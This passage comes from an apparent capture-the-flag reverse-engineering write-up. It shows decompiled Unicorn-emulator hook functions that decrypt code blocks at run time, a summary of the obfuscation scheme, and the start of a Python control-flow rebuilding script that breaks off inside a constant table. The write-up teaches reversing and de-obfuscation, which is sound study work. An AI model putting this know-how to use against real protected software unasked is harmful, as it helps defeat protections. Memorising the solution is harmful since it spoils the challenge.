class="hljs-number">0LL</span>);<br>    uc_reg_write(a1, <span class="hljs-number">35</span>, (__int64)&amp;v3);         <span class="hljs-comment">// 调用time(0),并且赋值给rax寄存器</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br><br>change_key:<br><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_563518A4CB02</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2, <span class="hljs-keyword">unsigned</span> __int64 a3, <span class="hljs-keyword">int</span> a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v6[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-10h] BYREF</span><br><br>  v6[<span class="hljs-number">1</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">16</span> &amp;&amp; a3 &gt; <span class="hljs-number">0x6665FFFF</span> &amp;&amp; a3 &lt;= <span class="hljs-number">0x66660FFF</span> &amp;&amp; a4 == <span class="hljs-number">8</span> )<br>  &#123;<br>    v6[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>    uc_mem_read(a1, a3, v6, <span class="hljs-number">8LL</span>);<br>    v6[<span class="hljs-number">0</span>] = <span class="hljs-number">0x756E69636F726E03</span>LL * v6[<span class="hljs-number">0</span>] + <span class="hljs-number">0xBADC0DEC001CAFE</span>LL;<br>    uc_mem_write(a1, a3, v6, <span class="hljs-number">8LL</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br><br>decrypt:<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">decrypt</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">unsigned</span> __int64 a2, __int64 a3, __int64 key_block)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+10h] [rbp-40h] BYREF</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-38h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-2Ch]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [rsp+28h] [rbp-28h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [rsp+2Ch] [rbp-24h]</span><br>  <span class="hljs-keyword">int</span> v10; <span class="hljs-comment">// [rsp+30h] [rbp-20h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> size[<span class="hljs-number">3</span>]; <span class="hljs-comment">// [rsp+34h] [rbp-1Ch]</span><br>  <span class="hljs-keyword">void</span> *ptr; <span class="hljs-comment">// [rsp+40h] [rbp-10h]</span><br>  <span class="hljs-keyword">void</span> *code_block; <span class="hljs-comment">// [rsp+48h] [rbp-8h]</span><br><br>  v6 = a1;<br>  v5 = a2;<br>  *(_QWORD *)&amp;size[<span class="hljs-number">1</span>] = key_block;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(key_block + <span class="hljs-number">16</span>) == a2 )<br>  &#123;<br>    result = *(_QWORD *)&amp;size[<span class="hljs-number">1</span>];<br>    *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">16LL</span>) = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) ) <span class="hljs-comment">// 当某个基本块执行结束</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) &lt;= v5 )<br>    &#123;<br>      result = v5;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(*(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) + *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>)) &gt; v5 )<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    ptr = <span class="hljs-built_in">malloc</span>(*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>));<span class="hljs-comment">// 下方这段是将上一个执行完的块再次加密</span><br>    uc_mem_read(<br>      v6,<br>      *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>),<br>      (__int64)ptr,<br>      *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>));<br>    dcode((__int64)ptr, *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>), *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">12LL</span>));<br>    uc_mem_write(v6, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>), ptr, *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>));<br>    <span class="hljs-built_in">free</span>(ptr);<br>  &#125;<br>  v10 = calc_key(**(_DWORD **)&amp;size[<span class="hljs-number">1</span>], v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt; <span class="hljs-number">0x55</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v10 == block_key_table[<span class="hljs-number">2</span> * i] )<br>    &#123;<br>      size[<span class="hljs-number">0</span>] = unk_56304FC676E4[<span class="hljs-number">2</span> * i];<br>      code_block = <span class="hljs-built_in">malloc</span>(size[<span class="hljs-number">0</span>]);<br>      uc_mem_read(v6, v5, (__int64)code_block, size[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 读指定长度的code</span><br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; j; ++j )<br>        ;<br>      dcode((__int64)code_block, size[<span class="hljs-number">0</span>], **(_DWORD **)&amp;size[<span class="hljs-number">1</span>]);<span class="hljs-comment">// 解密code的函数</span><br>      uc_mem_write(v6, v5, code_block, size[<span class="hljs-number">0</span>]);<span class="hljs-comment">// 将解密后的代码写回指定内存</span><br>      <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; size[<span class="hljs-number">0</span>] &gt; k; ++k )<br>        ;<br>      <span class="hljs-built_in">free</span>(code_block);<br>      *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">4LL</span>) = v5;<span class="hljs-comment">// 执行地址</span><br>      *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">12LL</span>) = **(_DWORD **)&amp;size[<span class="hljs-number">1</span>];<span class="hljs-comment">// 基本块密钥</span><br>      *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">8LL</span>) = size[<span class="hljs-number">0</span>];<span class="hljs-comment">// 这个块的代码长度</span><br>      *(_DWORD *)(*(_QWORD *)&amp;size[<span class="hljs-number">1</span>] + <span class="hljs-number">16LL</span>) = v5;<span class="hljs-comment">// 执行地址</span><br>      uc_reg_write(v6, <span class="hljs-number">41</span>, (__int64)&amp;v5);       <span class="hljs-comment">// 设置RIP寄存器</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br>conflow1:<br><span class="hljs-function">__int64 __fastcall <span class="hljs-title">con_1</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v2; <span class="hljs-comment">// rdx</span><br>  __int16 v4; <span class="hljs-comment">// [rsp+16h] [rbp-2Ah] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-keyword">int</span> key; <span class="hljs-comment">// [rsp+1Ch] [rbp-24h]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+28h] [rbp-18h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *v9; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v10 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v7 = <span class="hljs-number">0LL</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  uc_reg_read(a1, <span class="hljs-number">41</span>, (__int64)&amp;v7);            <span class="hljs-comment">// 读取rip寄存器的值</span><br>  uc_mem_read(a1, v7, (__int64)&amp;v4, <span class="hljs-number">2uLL</span>);<br>  <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-number">0x3F0F</span> )                           <span class="hljs-comment">// 块结束标志0x3f0f</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  v9 = a2;<br>  key = calc_key(*a2, v7);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( i &gt; <span class="hljs-number">0x54</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">if</span> ( key == *((_DWORD *)&amp;key_0 + <span class="hljs-number">5</span> * (<span class="hljs-keyword">int</span>)i) )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  v8 = <span class="hljs-number">0LL</span>;<br>  uc_reg_read(a1, <span class="hljs-number">25</span>, (__int64)&amp;v8);            <span class="hljs-comment">// 读取标志位寄存器</span><br>  <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x40</span>) != <span class="hljs-number">0</span> )<br>  &#123;<br>    *v9 += key_2[<span class="hljs-number">5</span> * i];                        <span class="hljs-comment">// zf=1</span><br>    v2 = *((<span class="hljs-keyword">int</span> *)&amp;jmp2 + <span class="hljs-number">5</span> * (<span class="hljs-keyword">int</span>)i);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *v9 += *(_DWORD *)&amp;key_1[<span class="hljs-number">20</span> * i];           <span class="hljs-comment">// zf=0</span><br>    v2 = *((<span class="hljs-keyword">int</span> *)&amp;jmp1 + <span class="hljs-number">5</span> * (<span class="hljs-keyword">int</span>)i);<br>  &#125;<br>  v7 += v2;<br>  uc_reg_write(a1, <span class="hljs-number">41</span>, (__int64)&amp;v7); <span class="hljs-comment">//设置RIP寄存器</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br><br>conflow_2:<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">con_2</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v5[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+28h] [rbp-18h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v5[<span class="hljs-number">1</span>] = (__int64)a4;<br>  *a4 -= <span class="hljs-number">0x2B09B990</span>;                            <span class="hljs-comment">// 计算key</span><br>  v5[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1EEC</span>LL;<br>  uc_reg_write(a1, <span class="hljs-number">41LL</span>, v5);                   <span class="hljs-comment">// 设置RIP寄存器</span><br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序整体我们分析完了，总结一下逻辑流程：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">通过unicorn模拟执行一段代码，执行每个基本块时会调用hook_add的回调函数decrypt，首先判断是否是上一个基本块执行结束，如果是，则将上一个基本块代码再加密。然后基本块密钥通过calc_key函数计算出一个值，之后调用解密代码进行基本块解密，再将解密后的代码存入原内存，设置RIP进行执行。执行过程中遇到相对应的指令，会调用<span class="hljs-meta">input</span>和<span class="hljs-meta">output</span>，还有syscall_time。读取fs段内容，会调用change_key。遇到非法指令会调用con_1，con_1用来计算下个块的地址和新的<span class="hljs-meta">key</span>，设置rip寄存器，继续执行。<br></code></pre></td></tr></table></figure><h2 id="控制流重建"><a href="#控制流重建" class="headerlink" title="控制流重建"></a>控制流重建</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python">思路：<br>先定义calc_key函数(通过基本块密钥计算key)，decode函数(解密代码块)，disasm函数(反汇编代码)。<br>dump程序中的jmp_table和block_key_table，并进行分组，jmp_table每五个一组，block_key_table每两个一组。使用BFS遍历代码块，根据conflow1和conflow2计算下一个基本块的地址，将对应的值存入realy_code。得到realy_code,添加跳转指令，最后进行重编译。<br><br><span class="hljs-keyword">import</span> struct, ctypes<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>jmp_table_plus = [<span class="hljs-number">0x00412F5E</span>, <span class="hljs-number">0xFFFFFA22</span>, <span class="hljs-number">0x14252652</span>, <span class="hljs-number">0xFFFFF9AC</span>, <span class="hljs-number">0x66CEF8EC</span>, <span class="hljs-number">0x0251D934</span>, <span class="hljs-number">0x0000009F</span>, <span class="hljs-number">0xC56FBF59</span>, <span class="hljs-number">0xFFFFFF61</span>, <span class="hljs-number">0xAA4D5B7C</span>, <span class="hljs-number">0x02745896</span>, <span class="hljs-number">0xFFFFFB7F</span>, <span class="hljs-number">0x34B6D31E</span>, <span class="hljs-number">0xFFFFFBB0</span>, <span class="hljs-number">0x302CC828</span>, <span class="hljs-number">0x02AC5992</span>, <span class="hljs-number">0xFFFFF524</span>, <span class="hljs-number">0x67CC4064</span>, <span class="hljs-number">0xFFFFF483</span>, <span class="hljs-number">0x8A5D9B26</span>, <span class="hljs-number">0x046254D0</span>, <span class="hljs-number">0xFFFFFC37</span>, <span class="hljs-number">0x074AB936</span>, <span class="hljs-number">0xFFFFFC7F</span>, <span class="hljs-number">0xB8EA37F7</span>, <span class="hljs-number">0x0CACD9FE</span>, <span class="hljs-number">0x0000007F</span>, <span class="hljs-number">0x6112F222</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x47A72561</span>, <span class="hljs-number">0x0F0FE6EB</span>, <span class="hljs-number">0xFFFFFBAE</span>, <span class="hljs-number">0x0A1411E7</span>, <span class="hljs-number">0xFFFFFC85</span>, <span class="hljs-number">0x3BE88B46</span>, <span class="hljs-number">0x0FC59DC2</span>, <span class="hljs-number">0xFFFFF72F</span>, <span class="hljs-number">0x7D12A5EF</span>, <span class="hljs-number">0xFFFFF691</span>, <span class="hljs-number">0xE67393D6</span>, <span class="hljs-number">0x10B1EBCA</span>, <span class="hljs-number">0x000001CF</span>, <span class="hljs-number">0x473A1295</span>, <span class="hljs-number">0x0000022E</span>, <span class="hljs-number">0x7BC15385</span>, <span class="hljs-number">0x1565D41D</span>, <span class="hljs-number">0xFFFFFDC4</span>, <span class="hljs-number">0x05D337BE</span>, <span class="hljs-number">0xFFFFFE7E</span>, <span class="hljs-number">0xE12982E4</span>, <span class="hljs-number">0x18909E40</span>, <span class="hljs-number">0x000005EB</span>, <span class="hljs-number">0xAE2337AF</span>, <span class="hljs-number">0x000005B1</span>, <span class="hljs-number">0x8E0AB2ED</span>, <span class="hljs-number">0x1AE7593A</span>, <span class="hljs-number">0xFFFFF3BC</span>, <span class="hljs-number">0x23E9058D</span>, <span class="hljs-number">0xFFFFF40B</span>, <span class="hljs-number">0xDFA6CF3E</span>, <span class="hljs-number">0x1B47DA81</span>, <span class="hljs-number">0xFFFFF8C3</span>, <span class="hljs-number">0x349CC616</span>, <span class="hljs-number">0xFFFFF7E9</span>, <span class="hljs-number">0x70C290D0</span>, <span class="hljs-number">0x1D816435</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x43F999C9</span>, <span class="hljs-number">0xFFFFFFD8</span>, <span class="hljs-number">0xAB0BCA16</span>, <span class="hljs-number">0x1DACC905</span>, <span class="hljs-number">0xFFFFFF54</span>, <span class="hljs-number">0x5C129962</span>, <span class="hljs-number">0xFFFFFD06</span>, <span class="hljs-number">0xE4515A41</span>, <span class="hljs-number">0x1E03B13C</span>, <span class="hljs-number">0xFFFFFF80</span>, <span class="hljs-number">0x7E763806</span>, <span class="hljs-number">0xFFFFF36A</span>, <span class="hljs-number">0xA25F3D93</span>, <span class="hljs-number">0x22FEFC06</span>, <span class="hljs-number">0xFFFFFCDD</span>, <span class="hljs-number">0xB94E0C2F</span>, <span class="hljs-number">0xFFFFFCB6</span>, <span class="hljs-number">0xF023033D</span>, <span class="hljs-number">0x26B1E690</span>, <span class="hljs-number">0xFFFFFDAB</span>, <span class="hljs-number">0xD0C7ED0C</span>, <span class="hljs-number">0xFFFFFE9B</span>, <span class="hljs-number">0xD49872C6</span>, <span class="hljs-number">0x2A652084</span>, <span class="hljs-number">0x000001EA</span>, <span class="hljs-number">0xDF9B65EE</span>, <span class="hljs-number">0x00000051</span>, <span class="hljs-number">0x5CC5AB90</span>, <span class="hljs-number">0x2FBEBD25</span>, <span class="hljs-number">0x0000048F</span>, <span class="hljs-number">0x60A4E9F2</span>, <span class="hljs-number">0x000009AF</span>, <span class="hljs-number">0x42FE8B0D</span>, <span class="hljs-number">0x34F12D90</span>, <span class="hljs-number">0x000004C0</span>, <span class="hljs-number">0xF6257D94</span>, <span class="hljs-number">0x00000480</span>, <span class="hljs-number">0x5227DE21</span>, <span class="hljs-number">0x35F591D0</span>, <span class="hljs-number">0xFFFFFCA1</span>, <span class="hljs-number">0xDA83E113</span>, <span class="hljs-number">0xFFFFF998</span>, <span class="hljs-number">0x805C7ECB</span>, <span class="hljs-number">0x37EB0B72</span>, <span class="hljs-number">0xFFFFF3EC</span>, <span class="hljs-number">0x7480201A</span>, <span class="hljs-number">0xFFFFF903</span>, <span class="hljs-number">0xAC977E11</span>, <span class="hljs-number">0x389A58A8</span>, <span class="hljs-number">0x00000189</span>, <span class="hljs-number">0xE4005CD7</span>, <span class="hljs-number">0xFFFFFDEC</span>, <span class="hljs-number">0xB043695F</span>, <span class="hljs-number">0x3CB24155</span>, <span class="hljs-number">0x0000084C</span>, <span class="hljs-number">0x8ACB6FF1</span>, <span class="hljs-number">0x00000899</span>, <span class="hljs-number">0xACB471A5</span>, <span class="hljs-number">0x3DCBCDE3</span>, <span class="hljs-number">0x000007A8</span>, <span class="hljs-number">0xA84E3072</span>, <span class="hljs-number">0x00000384</span>, <span class="hljs-number">0xB2624259</span>, <span class="hljs-number">0x3F5290DE</span>, <span class="hljs-number">0xFFFFFE25</span>, <span class="hljs-number">0x8AC11F92</span>, <span class="hljs-number">0xFFFFFD8A</span>, <span class="hljs-number">0x44ACCD78</span>, <span class="hljs-number">0x47FF9B7E</span>, <span class="hljs-number">0x00000A81</span>, <span class="hljs-number">0x9833BF9C</span>, <span class="hljs-number">0x00000B35</span>, <span class="hljs-number">0x9B7199CD</span>, <span class="hljs-number">0x4C7867E6</span>, <span class="hljs-number">0x0000011C</span>, <span class="hljs-number">0x68BB4F80</span>, <span class="hljs-number">0x0000002E</span>, <span class="hljs-number">0x75B675CD</span>, <span class="hljs-number">0x53ADCD80</span>, <span class="hljs-number">0x000004E8</span>, <span class="hljs-number">0x6AA4F705</span>, <span class="hljs-number">0x00000452</span>, <span class="hljs-number">0xBA7C314B</span>, <span class="hljs-number">0x566E1640</span>, <span class="hljs-number">0x00000C8E</span>, <span class="hljs-number">0x203E3737</span>, <span class="hljs-number">0x00000C38</span>, <span class="hljs-number">0xF9367ED9</span>, <span class="hljs-number">0x5EDBB130</span>, <span class="hljs-number">0x000004FF</span>, <span class="hljs-number">0xD4F71A40</span>, <span class="hljs-number">0x000002AA</span>, <span class="hljs-number">0x35DC4141</span>, <span class="hljs-number">0x6C29C83A</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0xBEAD8A76</span>, <span class="hljs-number">0xFFFFFFB5</span>, <span class="hljs-number">0x7A8A43EF</span>, <span class="hljs-number">0x6E036C9C</span>, <span class="hljs-number">0x00000BD5</span>, <span class="hljs-number">0x225F81E0</span>, <span class="hljs-number">0x00000D89</span>, <span class="hljs-number">0x3C25944D</span>, <span class="hljs-number">0x6FDCCE50</span>, <span class="hljs-number">0x00000605</span>, <span class="hljs-number">0xD3126740</span>, <span class="hljs-number">0x000003D5</span>, <span class="hljs-number">0xA3DA544C</span>, <span class="hljs-number">0x7132D345</span>, <span class="hljs-number">0x0000064E</span>, <span class="hljs-number">0x00915A5A</span>, <span class="hljs-number">0x000006DD</span>, <span class="hljs-number">0x5BCB6B22</span>, <span class="hljs-number">0x720DBD5C</span>, <span class="hljs-number">0x000008C3</span>, <span class="hljs-number">0x64DCFDF6</span>, <span class="hljs-number">0x00000858</span>, <span class="hljs-number">0x190B20BB</span>, <span class="hljs-number">0x7A035AD4</span>, <span class="hljs-number">0x00000424</span>, <span class="hljs-number">0x4DD955FB</span>, <span class="hljs-number">0x000004BF</span>, <span class="hljs-number">0xF65150B5</span>, <span class="hljs-number">0x7CBAED22</span>, <span class="hljs-number">0x00000AA1</span>, <span class="hljs-number">0x62CC154B</span>, <span class="hljs-number">0xFFFFFC58</span>, <span class="hljs-number">0x8DD5CEDB</span>, <span class="hljs-number">0x7EBF8EA8</span>, <span class="hljs-number">0x00000458</span>, <span class="hljs-number">0xCE844A0E</span>, <span class="hljs-number">0xFFFFF734</span>, <span class="hljs-number">0x9079D6BA</span>, <span class="hljs-number">0x804885CD</span>, <span class="hljs-number">0x000007BB</span>, <span class="hljs-number">0x89A8DA66</span>, <span class="hljs-number">0x00000136</span>, <span class="hljs-number">0x7185B813</span>, <span class="hljs-number">0x82190F37</span>, <span class="hljs-number">0xFFFFF58C</span>, <span class="hljs-number">0x013FA7D4</span>, <span class="hljs-number">0xFFFFF4AB</span>, <span class="hljs-number">0x7518093D</span>, <span class="hljs-number">0x83F7826A</span>, <span class="hljs-number">0x00000917</span>, <span class="hljs-number">0x2F33C3DD</span>, <span class="hljs-number">0xFFFFFBF0</span>, <span class="hljs-number">0x02A289B1</span>, <span class="hljs-number">0x8481BFD5</span>, <span class="hljs-number">0xFFFFF927</span>, <span class="hljs-number">0x72EED2D1</span>, <span class="hljs-number">0xFFFFF80A</span>, <span class="hljs-number">0xF46FD351</span>, <span class="hljs-number">0x85A69D6E</span>, <span class="hljs-number">0x000000B4</span>, <span class="hljs-number">0x27A3BB0F</span>, <span class="hljs-number">0x00000181</span>, <span class="hljs-number">0x49235BC0</span>, <span class="hljs-number">0x85F73150</span>, <span class="hljs-number">0x00000259</span>, <span class="hljs-number">0xA300692F</span>, <span class="hljs-number">0x000009BD</span>, <span class="hljs-number">0x5A3E46A9</span>, <span class="hljs-number">0x86E2497A</span>, <span class="hljs-number">0xFFFFFB53</span>, <span class="hljs-number">0xE7614707</span>, <span class="hljs-number">0xFFFFFBB3</span>, <span class="hljs-number">0xFA190B2A</span>, <span class="hljs-number">0x8B261F60</span>, <span class="hljs-number">0xFFFFF323</span>, <span class="hljs-number">0x97B9CC33</span>, <span class="hljs-number">0xFFFFFAB7</span>, <span class="hljs-number">0x2CB73BF0</span>, <span class="hljs-number">0x8B42B00C</span>, <span class="hljs-number">0x00000871</span>, <span class="hljs-number">0xA57A2DE3</span>, <span class="hljs-number">0x00000797</span>, <span class="hljs-number">0xA73082D6</span>, <span class="hljs-number">0x8E4C5C94</span>, <span class="hljs-number">0x000000FE</span>, <span class="hljs-number">0xEE4B594B</span>, <span class="hljs-number">0xFFFFF999</span>, <span class="hljs-number">0xDCE3B74D</span>, <span class="hljs-number">0x913A9FDB</span>, <span class="hljs-number">0xFFFFFE1C</span>, <span class="hljs-number">0x1BFFA329</span>, <span class="hljs-number">0xFFFFFD31</span>, <span class="hljs-number">0x49B21C95</span>, <span class="hljs-number">0x922BFB96</span>, <span class="hljs-number">0xFFFFF61B</span>, <span class="hljs-number">0x4FAFD829</span>, <span class="hljs-number">0xFFFFFBBA</span>, <span class="hljs-number">0x6BD5D317</span>, <span class="hljs-number">0x9F4B8702</span>, <span class="hljs-number">0xFFFFFEC1</span>, <span class="hljs-number">0xB691AD49</span>, <span class="hljs-number">0xFFFFFEF2</span>, <span class="hljs-number">0xCE6C6FE9</span>, <span class="hljs-number">0xA2CEAAA6</span>, <span class="hljs-number">0xFFFFFD89</span>, <span class="hljs-number">0x60E52701</span>, <span class="hljs-number">0xFFFFFCB2</span>, <span class="hljs-number">0x25AD9A9D</span>, <span class="hljs-number">0xAA970D72</span>, <span class="hljs-number">0xFFFFF2BB</span>, <span class="hljs-number">0xC1F58CAC</span>, <span class="hljs-number">0xFFFFF2AB</span>, <span class="hljs-number">0x20B8FE22</span>, <span class="hljs-number">0xABC02B72</span>, <span class="hljs-number">0xFFFFF94B</span>, <span class="hljs-number">0xFF6EA5A6</span>, <span class="hljs-number">0xFFFFFA6A</span>, <span class="hljs-number">0x1CD46647</span>, <span class="hljs-number">0xAE535E9E</span>, <span class="hljs-number">0x000003EC</span>, <span class="hljs-number">0x31246F6B</span>, <span class="hljs-number">0x0000035B</span>, <span class="hljs-number">0x50E2A20A</span>, <span class="hljs-number">0xB7337941</span>, <span 